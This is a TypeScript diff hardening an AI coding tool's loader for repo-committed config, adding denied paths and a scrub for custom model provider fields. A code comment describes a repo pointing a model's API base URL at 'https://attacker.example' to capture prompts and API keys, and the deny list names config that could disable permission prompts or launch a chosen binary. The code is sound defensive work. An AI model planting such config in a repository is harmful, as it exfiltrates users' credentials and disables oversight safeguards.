@@ -1,4 +1,5 @@
 import type { Config } from '@wrongstack/contracts/types/config';
+import { isPlainRecord } from './default-repair.js';
 import type { PartialConfig } from './env-overrides.js';
 
 const IN_PROJECT_ALLOWED_KEYS: ReadonlySet<string> = new Set([
@@ -315,6 +316,11 @@ const IN_PROJECT_DENIED_PATHS: ReadonlyArray<{ path: string; reason: string }> =
   // them is a product call.
   { path: 'Sage.storage.directory', reason: 'Redirects memory storage outside the profile.' },
   {
+    path: 'Sage.service',
+    reason:
+      'Selects the memory backend, its data root and a daemon executable to launch; a repo must not redirect memory or choose a binary.',
+  },
+  {
     path: 'autonomy.yolo',
     reason:
       'Alias for the denied top-level `yolo`, and it wins over the user setting — a repo-committed config could disable every permission prompt.',
@@ -594,6 +600,40 @@ export function stripUnsafeInProjectFields(
 
   for (const { path } of IN_PROJECT_DENIED_PATHS) {
     if (deleteNestedPath(out as Record<string, unknown>, path)) stripped.push(path);
+  }
+
+  // A custom model definition is allow-listed metadata, but `modelsDev.provider`
+  // is wire state: `api` is that model's API base URL (`native-catalog.ts`
+  // resolves `opts.baseUrl ?? model.provider.api`) and `npm` names the SDK
+  // package to load. The deny table can only name fixed dotted paths, and
+  // `models` is a map keyed by arbitrary model ids, so no path entry can cover
+  // it — leaving a repo able to ship `model: "x"` plus
+  // `models.x.modelsDev.provider.api = "https://attacker.example"` and receive
+  // every prompt and the user's API key. That is the exact exfiltration the
+  // denied top-level `baseUrl`/`providers`/`tools.wrongProxy` exist to stop, so
+  // this map gets its own scrub (benign metadata — name, capabilities, limits,
+  // cost — is kept).
+  if (isPlainRecord(out.models)) {
+    const models: Record<string, unknown> = {};
+    let scrubbedModels = false;
+    for (const [id, definition] of Object.entries(out.models)) {
+      if (!isPlainRecord(definition)) {
+        models[id] = definition;
+        continue;
+      }
+      const modelsDev = definition['modelsDev'];
+      if (!isPlainRecord(modelsDev) || !Object.hasOwn(modelsDev, 'provider')) {
+        models[id] = definition;
+        continue;
+      }
+      const { provider: _provider, ...keptModelsDev } = modelsDev;
+      models[id] = { ...definition, modelsDev: keptModelsDev };
+      scrubbedModels = true;
+    }
+    if (scrubbedModels) {
+      out.models = models as NonNullable<PartialConfig['models']>;
+      stripped.push('models.*.modelsDev.provider');
+    }
   }
 
   if (stripped.length > 0) {
